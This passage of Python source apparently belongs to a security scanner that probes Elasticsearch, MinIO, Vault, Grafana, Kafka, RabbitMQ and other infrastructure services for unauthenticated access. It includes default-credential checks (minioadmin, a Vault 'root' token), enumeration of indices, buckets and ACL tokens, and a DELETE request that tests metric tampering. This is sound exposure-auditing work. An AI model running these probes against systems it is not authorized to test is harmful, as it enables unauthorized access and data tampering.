                "title": "ARGO_NAMESPACE_WORKFLOWS_UNAUTH",
                "detail": (
                    f"GET /api/v1/workflows/argo on "
                    f"{scheme}://{host}:{port} returned {len(items)} "
                    "workflow(s) in argo namespace without authentication"
                ),
                "host": host,
                "port": port,
            })
            break
        if status is not None and status not in (0, 404):
            break

    for scheme in ("https", "http"):
        # ── GET /api/v1/workflowtemplates/default ──────────────────────────
        status, body = _get(host, port, "/api/v1/workflowtemplates/default", scheme)
        if status == 200:
            try:
                data = json.loads(body)
                items = data.get("items") or []
            except Exception:
                items = []
            findings.append({
                "severity": "HIGH",
                "title": "ARGO_TEMPLATES_UNAUTH",
                "detail": (
                    f"GET /api/v1/workflowtemplates/default on "
                    f"{scheme}://{host}:{port} returned {len(items)} "
                    "template(s) without authentication — "
                    "reusable workflow templates exposed"
                ),
                "host": host,
                "port": port,
            })

            # ── scan script sources for sensitive content ───────────────────
            secret_tmpls: list = []
            for wft in items:
                templates = (wft.get("spec") or {}).get("templates") or []
                secret_tmpls.extend(_template_has_secrets(templates))
            if secret_tmpls:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "ARGO_TEMPLATE_WITH_SECRETS",
                    "detail": (
                        f"Workflow template(s) on "
                        f"{scheme}://{host}:{port} contain script.source "
                        f"with sensitive commands/credentials: "
                        f"{', '.join(secret_tmpls[:10])}"
                    ),
                    "host": host,
                    "port": port,
                })
            break
        if status is not None and status not in (0, 404):
            break

    return findings


# ─── Elasticsearch / Kibana ────────────────────────────────────────────────

def probe_elasticsearch_exposure(host: str, port: int = 9200,
                                  timeout: float = 10.0) -> list:
    """
    Probe for unauthenticated Elasticsearch cluster and Kibana exposure.

    Checks cluster info, index listing with PII-indicator names, node
    topology, and Kibana dashboard reachability — all without credentials.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    PII_INDICATORS = (
        "user", "customer", "patient", "order", "payment", "health", "log",
    )

    def _get(h: str, p: int, path: str, scheme: str = "http") -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        req.add_header("Accept", "application/json")
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(131072)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, body
        except Exception:
            return None, b""

    for scheme in ("http", "https"):
        # ── GET / — cluster info ───────────────────────────────────────────
        status, body = _get(host, port, "/", scheme)
        if status == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "ELASTICSEARCH_UNAUTH",
                "detail": (
                    f"GET / on {scheme}://{host}:{port} returned cluster "
                    "info without authentication"
                ),
                "host": host,
                "port": port,
            })

            # ── GET /_cat/indices?v — index listing ────────────────────────
            idx_status, idx_body = _get(host, port, "/_cat/indices?v", scheme)
            if idx_status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "ELASTICSEARCH_INDICES_UNAUTH",
                    "detail": (
                        f"GET /_cat/indices?v on {scheme}://{host}:{port} "
                        "returned all index names and document counts "
                        "without authentication"
                    ),
                    "host": host,
                    "port": port,
                })

                # scan index names for PII indicators
                try:
                    idx_text = idx_body.decode("utf-8", errors="replace")
                except Exception:
                    idx_text = ""
                sensitive: list = []
                for line in idx_text.splitlines():
                    parts = line.split()
                    # _cat/indices columns: health status index ...
                    if len(parts) >= 3:
                        name = parts[2].lower()
                        for indicator in PII_INDICATORS:
                            if indicator in name and name not in sensitive:
                                sensitive.append(name)
                                break
                for idx_name in sensitive:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "ELASTICSEARCH_SENSITIVE_INDEX",
                        "detail": (
                            f"{idx_name} index on "
                            f"{scheme}://{host}:{port} likely contains "
                            "sensitive data"
                        ),
                        "host": host,
                        "port": port,
                    })

            # ── GET /_cat/nodes — node topology ────────────────────────────
            nd_status, _ = _get(host, port, "/_cat/nodes", scheme)
            if nd_status == 200:
                findings.append({
                    "severity": "HIGH",
                    "title": "ELASTICSEARCH_NODES_UNAUTH",
                    "detail": (
                        f"GET /_cat/nodes on {scheme}://{host}:{port} "
                        "returned cluster node topology without authentication"
                    ),
                    "host": host,
                    "port": port,
                })

            break
        if status is not None and status not in (0, 401, 403, 404):
            break

    # ── GET http://host:5601/api/status — Kibana ───────────────────────────
    for scheme in ("http", "https"):
        kb_status, _ = _get(host, 5601, "/api/status", scheme)
        if kb_status == 200:
            findings.append({
                "severity": "HIGH",
                "title": "KIBANA_UNAUTH",
                "detail": (
                    f"GET /api/status on {scheme}://{host}:5601 returned "
                    "Kibana status without authentication — dashboard exposed"
                ),
                "host": host,
                "port": 5601,
            })
            break
        if kb_status is not None and kb_status not in (0, 401, 403, 404):
            break

    return findings


# ─── MinIO ─────────────────────────────────────────────────────────────────

def probe_minio_exposure(host: str, port: int = 9000,
                         timeout: float = 10.0) -> list:
    """
    Probe for unauthenticated MinIO S3-compatible storage exposure.

    Checks health endpoint, bucket listing, MinIO Console UI, per-bucket
    object listing, and default-credential risk indicator.

    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    _tls_ctx = ssl.create_default_context()
    _tls_ctx.check_hostname = False
    _tls_ctx.verify_mode = ssl.CERT_NONE

    def _get(h: str, p: int, path: str, scheme: str = "http",
             extra_headers: dict | None = None) -> tuple:
        url = f"{scheme}://{h}:{p}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ablation/1.0")
        req.add_header("Accept", "application/xml, application/json, */*")
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        try:
            kwargs: dict = {"timeout": timeout}
            if scheme == "https":
                kwargs["context"] = _tls_ctx
            with urllib.request.urlopen(req, **kwargs) as r:
                return r.status, r.read(131072)
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096)
            except Exception:
                body = b""
            return e.code, body
        except Exception:
            return None, b""

    for scheme in ("http", "https"):
        # ── GET /minio/health/live — health probe ──────────────────────────
        h_status, _ = _get(host, port, "/minio/health/live", scheme)
        if h_status == 200:
            findings.append({
                "severity": "INFO",
                "title": "MINIO_HEALTH_ENDPOINT",
                "detail": (
                    f"GET /minio/health/live on {scheme}://{host}:{port} "
                    "accessible — MinIO instance confirmed live"
                ),
                "host": host,
                "port": port,
            })

        # ── GET / — bucket listing (XML response) ──────────────────────────
        b_status, b_body = _get(host, port, "/", scheme)
        if b_status == 200 and b"<ListAllMyBucketsResult" in b_body:
            findings.append({
                "severity": "CRITICAL",
                "title": "MINIO_BUCKET_LIST_UNAUTH",
                "detail": (
                    f"GET / on {scheme}://{host}:{port} returned S3 bucket "
                    "listing XML without authentication"
                ),
                "host": host,
                "port": port,
            })

            # extract first bucket name for contents probe
            bucket_name: str = ""
            m = re.search(rb"<Name>([^<]+)</Name>", b_body)
            if m:
                bucket_name = m.group(1).decode("utf-8", errors="replace").strip()

            if bucket_name:
                c_status, _ = _get(
                    host, port,
                    f"/{bucket_name}?list-type=2",
                    scheme,
                )
                if c_status == 200:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "MINIO_BUCKET_CONTENTS_UNAUTH",
                        "detail": (
                            f"GET /{bucket_name}?list-type=2 on "
                            f"{scheme}://{host}:{port} returned bucket "
                            "object listing without authentication"
                        ),
                        "host": host,
                        "port": port,
                    })

            # default-creds risk: absence of STS session rotation on an open
            # instance indicates static creds in use, likely defaults
            findings.append({
                "severity": "HIGH",
                "title": "MINIO_DEFAULT_CREDS_RISK",
                "detail": (
                    f"MinIO on {scheme}://{host}:{port} is accessible "
                    "without authentication and shows no STS session "
                    "rotation — may have default credentials "
                    "(minioadmin:minioadmin)"
                ),
                "host": host,
                "port": port,
            })

            break

        if b_status is not None and b_status not in (0, 403, 404):
            break
        if h_status == 200:
            # health responded but root did not expose buckets — still flag
            findings.append({
                "severity": "HIGH",
                "title": "MINIO_DEFAULT_CREDS_RISK",
                "detail": (
                    f"MinIO on {scheme}://{host}:{port} health endpoint "
                    f"is open but bucket listing returned {b_status}; "
                    "default credentials (minioadmin:minioadmin) may apply"
                ),
                "host": host,
                "port": port,
            })
            break

    # ── GET http://host:9001/ — MinIO Console UI ───────────────────────────
    for scheme in ("http", "https"):
        c_status, c_body = _get(host, 9001, "/", scheme)
        if c_status == 200 and (
            b"MinIO" in c_body or b"minio" in c_body or b"Console" in c_body
        ):
            findings.append({
                "severity": "HIGH",
                "title": "MINIO_CONSOLE_EXPOSED",
                "detail": (
                    f"GET / on {scheme}://{host}:9001 returned MinIO "
                    "Console web UI without authentication"
                ),
                "host": host,
                "port": 9001,
            })
            break
        if c_status is not None and c_status not in (0, 404):
            break

    return findings


# ─── Prometheus Alertmanager ───────────────────────────────────────────────

def probe_alertmanager_exposure(host: str, port: int = 9093,
                                timeout: float = 10.0) -> list:
    """Probe Prometheus Alertmanager for unauthenticated API exposure."""
    findings: list = []

    endpoints = [
        (
            "/api/v2/status",
            "HIGH",
            "ALERTMANAGER_UNAUTH",
            "Prometheus Alertmanager accessible without authentication",
        ),
        (
            "/api/v2/alerts",
            "CRITICAL",
            "ALERTMANAGER_ALERTS_UNAUTH",
            "active alert list readable (infra topology + incident status disclosed)",
        ),
        (
            "/api/v2/receivers",
            "CRITICAL",
            "ALERTMANAGER_RECEIVERS_UNAUTH",
            "alert receiver config exposed (email/Slack/PagerDuty webhooks)",
        ),
        (
            "/api/v2/silence",
            "MEDIUM",
            "ALERTMANAGER_SILENCES_UNAUTH",
            "alert silence rules exposed",
        ),
    ]

    for path, severity, title, detail_suffix in endpoints:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": (
                            f"GET {url} returned HTTP 200 without "
                            f"authentication — {detail_suffix}"
                        ),
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    return findings


# ─── Thanos / Cortex Querier ───────────────────────────────────────────────

def probe_thanos_querier(host: str, port: int = 10902,
                         timeout: float = 10.0) -> list:
    """Probe Thanos Querier (and Ruler) for unauthenticated access."""
    findings: list = []

    querier_endpoints = [
        (
            host, port, "/-/ready",
            "HIGH",
            "THANOS_QUERIER_UNAUTH",
            "Thanos Querier accessible without authentication",
        ),
        (
            host, port, "/api/v1/stores",
            "CRITICAL",
            "THANOS_STORES_UNAUTH",
            "Thanos store nodes enumerable (complete metrics backend topology)",
        ),
        (
            host, port, "/api/v1/query?query=up",
            "CRITICAL",
            "THANOS_QUERY_UNAUTH",
            "PromQL execution without authentication",
        ),
        (
            host, 19192, "/-/ready",
            "HIGH",
            "THANOS_RULER_UNAUTH",
            "Thanos Ruler exposed (alert rule execution without auth)",
        ),
    ]

    for h, p, path, severity, title, detail_suffix in querier_endpoints:
        url = f"http://{h}:{p}{path}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": (
                            f"GET {url} returned HTTP 200 without "
                            f"authentication — {detail_suffix}"
                        ),
                        "host": h,
                        "port": p,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    return findings


# ─── HashiCorp Vault ────────────────────────────────────────────────────────

def probe_vault_secrets_manager(host: str, port: int = 8200,
                                timeout: float = 10.0) -> list:
    """Probe HashiCorp Vault for unauthenticated access and default credentials."""
    findings: list = []

    def _get(path: str, headers: dict | None = None) -> int | None:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return None

    # Health endpoint — no auth required by design; always externally reachable
    status = _get("/v1/sys/health")
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "VAULT_HEALTH_EXPOSED",
            "detail": (
                f"GET http://{host}:{port}/v1/sys/health returned HTTP 200 "
                "without authentication — HashiCorp Vault health endpoint accessible"
            ),
            "host": host,
            "port": port,
        })

    # Init status — exposes whether cluster is initialised / unsealed
    status = _get("/v1/sys/init")
    if status == 200:
        findings.append({
            "severity": "MEDIUM",
            "title": "VAULT_INIT_STATUS",
            "detail": (
                f"GET http://{host}:{port}/v1/sys/init returned HTTP 200 "
                "without authentication — Vault initialization status exposed (unsealed state)"
            ),
            "host": host,
            "port": port,
        })

    # Seal status — leaks key share count and threshold
    status = _get("/v1/sys/seal-status")
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "VAULT_SEAL_STATUS_UNAUTH",
            "detail": (
                f"GET http://{host}:{port}/v1/sys/seal-status returned HTTP 200 "
                "without authentication — Vault seal status and key shares exposed"
            ),
            "host": host,
            "port": port,
        })

    # Root token default credential check
    status = _get("/v1/auth/token/lookup-self",
                  headers={"X-Vault-Token": "root"})
    if status == 200:
        findings.append({
            "severity": "CRITICAL",
            "title": "VAULT_ROOT_TOKEN_ACCEPTED",
            "detail": (
                f"GET http://{host}:{port}/v1/auth/token/lookup-self with "
                "X-Vault-Token: root returned HTTP 200 — "
                "Vault root token active (default credentials)"
            ),
            "host": host,
            "port": port,
        })

    # KV secrets list — unauthenticated secret path enumeration
    status = _get("/v1/secret/data/")
    if status == 200:
        findings.append({
            "severity": "CRITICAL",
            "title": "VAULT_SECRETS_UNAUTH",
            "detail": (
                f"GET http://{host}:{port}/v1/secret/data/ returned HTTP 200 "
                "without authentication — Vault secret paths enumerable without authentication"
            ),
            "host": host,
            "port": port,
        })

    return findings


# ─── HashiCorp Boundary ─────────────────────────────────────────────────────

def probe_hashicorp_boundary(host: str, port: int = 9200,
                             timeout: float = 10.0) -> list:
    """Probe HashiCorp Boundary controller for unauthenticated access."""
    findings: list = []

    boundary_endpoints = [
        (
            "/v1/health",
            "HIGH",
            "BOUNDARY_HEALTH_UNAUTH",
            "HashiCorp Boundary controller health accessible",
        ),
        (
            "/v1/auth-methods",
            "HIGH",
            "BOUNDARY_AUTH_METHODS_UNAUTH",
            "Boundary authentication methods enumerable",
        ),
        (
            "/v1/hosts",
            "CRITICAL",
            "BOUNDARY_HOST_CATALOG_UNAUTH",
            "Boundary host catalog exposed (managed infrastructure topology)",
        ),
        (
            "/v1/sessions",
            "CRITICAL",
            "BOUNDARY_SESSIONS_UNAUTH",
            "active user sessions visible without authentication",
        ),
    ]

    for path, severity, title, detail_suffix in boundary_endpoints:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": (
                            f"GET {url} returned HTTP 200 without "
                            f"authentication — {detail_suffix}"
                        ),
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    return findings


# ─── InfluxDB ────────────────────────────────────────────────────────────────

def probe_influxdb_exposure(host: str, port: int = 8086,
                            timeout: float = 10.0) -> list:
    """Probe InfluxDB time-series database for unauthenticated access."""
    findings: list = []

    influxdb_endpoints = [
        (
            "/ping",
            "HIGH",
            "INFLUXDB_PING_UNAUTH",
            "InfluxDB time-series database accessible",
        ),
        (
            "/query?q=SHOW+DATABASES",
            "CRITICAL",
            "INFLUXDB_DATABASES_UNAUTH",
            "InfluxDB database list enumerable without authentication",
        ),
        (
            "/query?db=telegraf&q=SELECT+*+FROM+cpu+LIMIT+5",
            "CRITICAL",
            "INFLUXDB_QUERY_UNAUTH",
            "InfluxDB allows unauthenticated queries",
        ),
        (
            "/api/v2/buckets",
            "CRITICAL",
            "INFLUXDB_V2_BUCKETS_UNAUTH",
            "InfluxDB v2 bucket list accessible without auth token",
        ),
    ]

    for path, severity, title, detail_suffix in influxdb_endpoints:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": (
                            f"GET {url} returned HTTP 200 without "
                            f"authentication — {detail_suffix}"
                        ),
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    return findings


# ─── Grafana ─────────────────────────────────────────────────────────────────

def probe_grafana_dashboard(host: str, port: int = 3000,
                            timeout: float = 10.0) -> list:
    """Probe Grafana dashboard for unauthenticated access."""
    findings: list = []

    grafana_endpoints = [
        (
            "/api/health",
            "HIGH",
            "GRAFANA_API_EXPOSED",
            "Grafana API accessible",
        ),
        (
            "/api/dashboards/home",
            "HIGH",
            "GRAFANA_DASHBOARD_UNAUTH",
            "Grafana dashboard accessible without authentication",
        ),
        (
            "/api/datasources",
            "CRITICAL",
            "GRAFANA_DATASOURCES_UNAUTH",
            "Grafana data sources enumerable (includes DB credentials)",
        ),
        (
            "/api/users",
            "CRITICAL",
            "GRAFANA_USERS_UNAUTH",
            "Grafana user list accessible without admin auth",
        ),
    ]

    for path, severity, title, detail_suffix in grafana_endpoints:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    findings.append({
                        "severity": severity,
                        "title": title,
                        "detail": (
                            f"GET {url} returned HTTP 200 without "
                            f"authentication — {detail_suffix}"
                        ),
                        "host": host,
                        "port": port,
                    })
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    return findings


# ─── Prometheus PushGateway ───────────────────────────────────────────────────

def probe_prometheus_pushgateway(host: str, port: int = 9091,
                                  timeout: float = 10.0) -> list:
    """Probe Prometheus PushGateway for unauthenticated access."""
    findings: list = []

    # Liveness check
    ready_url = f"http://{host}:{port}/-/ready"
    req = urllib.request.Request(ready_url, headers={"Accept": "text/plain"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "HIGH",
                    "title": "PUSHGATEWAY_UNAUTH",
                    "detail": (
                        f"GET {ready_url} returned HTTP 200 without "
                        f"authentication — Prometheus PushGateway accessible "
                        f"without authentication"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        return findings

    # All pushed metrics
    metrics_url = f"http://{host}:{port}/metrics"
    req = urllib.request.Request(metrics_url, headers={"Accept": "text/plain"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "PUSHGATEWAY_METRICS_UNAUTH",
                    "detail": (
                        f"GET {metrics_url} returned HTTP 200 without "
                        f"authentication — all pushed service metrics readable "
                        f"(may include application secrets in labels)"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    # Metric names list
    api_url = f"http://{host}:{port}/api/v1/metrics"
    req = urllib.request.Request(api_url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "HIGH",
                    "title": "PUSHGATEWAY_METRIC_NAMES_UNAUTH",
                    "detail": (
                        f"GET {api_url} returned HTTP 200 without "
                        f"authentication — metric job names enumerable "
                        f"(service inventory)"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    # Delete tamper check
    delete_url = f"http://{host}:{port}/metrics/job/test-ablation"
    req = urllib.request.Request(
        delete_url,
        method="DELETE",
        headers={"Accept": "text/plain"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status in (200, 202):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "PUSHGATEWAY_DELETE_UNAUTH",
                    "detail": (
                        f"DELETE {delete_url} returned HTTP {resp.status} "
                        f"without authentication — PushGateway allows metric "
                        f"deletion without authentication (data tampering)"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    return findings


# ─── HashiCorp Nomad ──────────────────────────────────────────────────────────

def probe_nomad_orchestrator(host: str, port: int = 4646,
                              timeout: float = 10.0) -> list:
    """Probe HashiCorp Nomad orchestrator for unauthenticated access."""
    findings: list = []

    # Leader check
    leader_url = f"http://{host}:{port}/v1/status/leader"
    req = urllib.request.Request(
        leader_url, headers={"Accept": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "HIGH",
                    "title": "NOMAD_STATUS_UNAUTH",
                    "detail": (
                        f"GET {leader_url} returned HTTP 200 without "
                        f"authentication — HashiCorp Nomad cluster accessible "
                        f"without authentication"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        return findings

    # Job list
    jobs_url = f"http://{host}:{port}/v1/jobs"
    req = urllib.request.Request(
        jobs_url, headers={"Accept": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NOMAD_JOBS_UNAUTH",
                    "detail": (
                        f"GET {jobs_url} returned HTTP 200 without "
                        f"authentication — Nomad job definitions enumerable "
                        f"(application configs, image names)"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    # Node list
    nodes_url = f"http://{host}:{port}/v1/nodes"
    req = urllib.request.Request(
        nodes_url, headers={"Accept": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NOMAD_NODES_UNAUTH",
                    "detail": (
                        f"GET {nodes_url} returned HTTP 200 without "
                        f"authentication — Nomad agent node topology accessible"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    # ACL tokens
    acl_url = f"http://{host}:{port}/v1/acl/tokens"
    req = urllib.request.Request(
        acl_url, headers={"Accept": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NOMAD_ACL_TOKENS_UNAUTH",
                    "detail": (
                        f"GET {acl_url} returned HTTP 200 without "
                        f"authentication — Nomad access control tokens accessible"
                    ),
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    return findings


# ─── Kafka exposure probe ──────────────────────────────────────────────────

def probe_kafka_exposure(host: str, port: int = 9092, timeout: float = 10.0) -> list:
    """
    Detect exposed Apache Kafka broker.
    Probes plaintext (9092), TLS (9093), REST proxy (8082/8080), Schema Registry (8081).
    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    findings: list = []

    # ── Port 9092 plaintext ────────────────────────────────────────────────
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        findings.append({
            "severity": "HIGH",
            "title": "KAFKA_PORT_OPEN",
            "detail": (
                f"TCP connect to {host}:{port} succeeded — "
                f"Kafka plaintext broker port reachable"
            ),
            "host": host,
            "port": port,
        })

        # API_VERSIONS request v0 (API key 18 = 0x0012)
        # wire: 4-byte total-len | 2-byte api_key | 2-byte api_version |
        #        4-byte correlation_id | 2-byte client_id_len (-1 = null)
        api_versions_req = (
            b'\x00\x00\x00\x0a'   # total length = 10
            b'\x00\x12'           # api_key = 18 (API_VERSIONS)
            b'\x00\x00'           # api_version = 0
            b'\x00\x00\x00\x01'  # correlation_id = 1
            b'\xff\xff'           # client_id = null
        )
        sock.sendall(api_versions_req)
        sock.settimeout(timeout)
        av_resp = b""
        try:
            chunk = sock.recv(4096)
            if chunk:
                av_resp = chunk
        except socket.timeout:
            pass

        if av_resp:
            findings.append({
                "severity": "CRITICAL",
                "title": "KAFKA_UNAUTHENTICATED_CONNECTION",
                "detail": (
                    f"Kafka broker at {host}:{port} responded to unauthenticated "
                    f"API_VERSIONS request ({len(av_resp)} bytes) — "
                    f"no SASL/SSL enforced at the wire level"
                ),
                "host": host,
                "port": port,
            })

            # ApiVersions response layout (after 4-byte frame length):
            # 4-byte correlation_id | 2-byte error_code | ...
            if len(av_resp) >= 10:
                try:
                    error_code = struct.unpack(">h", av_resp[4:6])[0]
                    if error_code == 0:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "KAFKA_API_VERSIONS_EXPOSED",
                            "detail": (
                                f"Kafka broker returned API_VERSIONS with error_code=0 "
                                f"({len(av_resp)} bytes) — full API surface enumerable "
                                f"without authentication"
                            ),
                            "host": host,
                            "port": port,
                        })
                except struct.error:
                    pass

        # Metadata request (API key 3, version 0) for __consumer_offsets
        topic = b"__consumer_offsets"
        topic_len_bytes = struct.pack(">h", len(topic))
        meta_header = struct.pack(">hhi", 3, 0, 2)  # api_key=3, version=0, corr_id=2
        client_id_null = struct.pack(">h", -1)
        num_topics = struct.pack(">i", 1)
        meta_body = meta_header + client_id_null + num_topics + topic_len_bytes + topic
        meta_req = struct.pack(">i", len(meta_body)) + meta_body
        try:
            sock.sendall(meta_req)
            meta_resp = b""
            try:
                chunk = sock.recv(4096)
                if chunk:
                    meta_resp = chunk
            except socket.timeout:
                pass
            if meta_resp and len(meta_resp) > 8:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "KAFKA_TOPIC_METADATA_UNAUTH",
                    "detail": (
                        f"Kafka broker returned Metadata response for "
                        f"'__consumer_offsets' without authentication "
                        f"({len(meta_resp)} bytes) — topic layout and broker "
                        f"topology enumerable"
                    ),
                    "host": host,
                    "port": port,
                })
        except Exception:
            pass

        try:
            sock.close()
        except Exception:
            pass
    except Exception:
        pass

    # ── Port 9093 TLS ─────────────────────────────────────────────────────
    tls_port = 9093
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, tls_port), timeout=timeout)
        tls_sock = ctx.wrap_socket(raw, server_hostname=host)
        tls_sock.close()
        findings.append({
            "severity": "HIGH",
            "title": "KAFKA_TLS_PORT_OPEN",
            "detail": (
                f"TLS handshake to {host}:{tls_port} succeeded — "
                f"Kafka SSL listener reachable"
            ),
            "host": host,
            "port": tls_port,
        })
    except Exception:
        pass

    # ── Kafka REST Proxy (8082 primary, 8080 fallback) ────────────────────
    for rest_port in (8082, 8080):
        rest_url = f"http://{host}:{rest_port}/topics"
        req = urllib.request.Request(
            rest_url,
            headers={"Accept": "application/vnd.kafka.v2+json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=int(timeout)) as r:
                if r.status == 200:
                    preview = r.read(256)
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "KAFKA_REST_PROXY_UNAUTH",
                        "detail": (
                            f"GET {rest_url} returned HTTP 200 without auth — "
                            f"Kafka REST Proxy topic list exposed: {preview[:128]!r}"
                        ),
                        "host": host,
                        "port": rest_port,
                    })
                    break
        except urllib.error.HTTPError:
            pass
        except Exception:
            pass

    # ── Schema Registry (8081) ────────────────────────────────────────────
    schema_port = 8081
    schema_url = f"http://{host}:{schema_port}/subjects"
    sr_req = urllib.request.Request(schema_url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(sr_req, timeout=int(timeout)) as r:
            if r.status == 200:
                preview = r.read(256)
                findings.append({
                    "severity": "CRITICAL",
                    "title": "KAFKA_SCHEMA_REGISTRY_UNAUTH",
                    "detail": (
                        f"GET {schema_url} returned HTTP 200 without auth — "
                        f"Confluent Schema Registry subjects exposed: {preview[:128]!r}"
                    ),
                    "host": host,
                    "port": schema_port,
                })
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

    return findings


# ─── RabbitMQ exposure probe ───────────────────────────────────────────────

def probe_rabbitmq_exposure(host: str, port: int = 5672, timeout: float = 10.0) -> list:
    """
    Detect exposed RabbitMQ message broker.
    Probes AMQP (5672), AMQPS (5671), Management API (15672), STOMP (61613).
    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    import base64
    findings: list = []

    # ── AMQP plaintext (5672) ──────────────────────────────────────────────
    amqp_header = b'AMQP\x00\x00\x09\x01'
    try:
        amqp_sock = socket.create_connection((host, port), timeout=timeout)
        amqp_sock.sendall(amqp_header)
        amqp_sock.settimeout(timeout)
        amqp_resp = b""
        try:
            chunk = amqp_sock.recv(4096)
            if chunk:
                amqp_resp = chunk
        except socket.timeout:
            pass

        if amqp_resp:
            findings.append({
                "severity": "HIGH",
                "title": "RABBITMQ_AMQP_RESPONSIVE",
                "detail": (
                    f"RabbitMQ AMQP port {host}:{port} responded to protocol "
                    f"header ({len(amqp_resp)} bytes)"
                ),
                "host": host,
                "port": port,
            })
            # AMQP Connection.Start frame: type=1 (METHOD), channel=0
            # or protocol rejection echoing b'AMQP'
            if amqp_resp[:4] == b'AMQP' or (len(amqp_resp) >= 1 and amqp_resp[0] == 1):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "RABBITMQ_AMQP_UNAUTH_CONNECT",
                    "detail": (
                        f"RabbitMQ broker at {host}:{port} returned Connection.Start "
                        f"frame — SASL negotiation reachable without network-layer "
                        f"controls; plaintext credential exchange possible"
                    ),
                    "host": host,
                    "port": port,
                })
        try:
            amqp_sock.close()
        except Exception:
            pass
    except Exception:
        pass

    # ── Management API (15672) ─────────────────────────────────────────────
    mgmt_port = RABBITMQ_MGMT_PORT  # 15672

    overview_url = f"http://{host}:{mgmt_port}/api/overview"
